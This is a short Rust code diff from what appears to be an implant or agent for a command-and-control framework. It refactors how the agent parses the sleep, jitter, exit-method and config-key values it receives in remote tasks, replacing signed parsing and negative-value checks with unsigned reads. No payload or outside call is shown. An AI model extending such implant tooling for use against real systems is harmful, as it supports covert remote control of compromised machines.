@@ -71,14 +71,8 @@ pub(crate) async fn execute(
         DemonCommand::CommandNoJob => {}
         DemonCommand::CommandSleep => {
             let mut parser = TaskParser::new(&package.payload);
-            let delay_ms = match u32::try_from(parser.int32()?) {
-                Ok(v) => v,
-                Err(_) => {
-                    tracing::warn!("CommandSleep: negative delay clamped to 0");
-                    0
-                }
-            };
-            let jitter = u32::try_from(parser.int32()?).unwrap_or(0).min(100);
+            let delay_ms = parser.uint32()?;
+            let jitter = parser.uint32()?.min(100);
             config.sleep_delay_ms = delay_ms;
             config.sleep_jitter = jitter;
             state.queue_callback(PendingCallback::Output {
@@ -146,8 +140,7 @@ pub(crate) async fn execute(
         }
         DemonCommand::CommandExit => {
             let mut parser = TaskParser::new(&package.payload);
-            let exit_method = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative exit method"))?;
+            let exit_method = parser.uint32()?;
             state.queue_callback(PendingCallback::Exit {
                 request_id: package.request_id,
                 exit_method,
@@ -243,8 +236,7 @@ fn execute_config(
     state: &mut PhantomState,
 ) -> Result<(), PhantomError> {
     let mut parser = TaskParser::new(payload);
-    let raw_key = u32::try_from(parser.int32()?)
-        .map_err(|_| PhantomError::TaskParse("negative config key"))?;
+    let raw_key = parser.uint32()?;
 
     let key = match DemonConfigKey::try_from(raw_key) {
         Ok(key) => key,
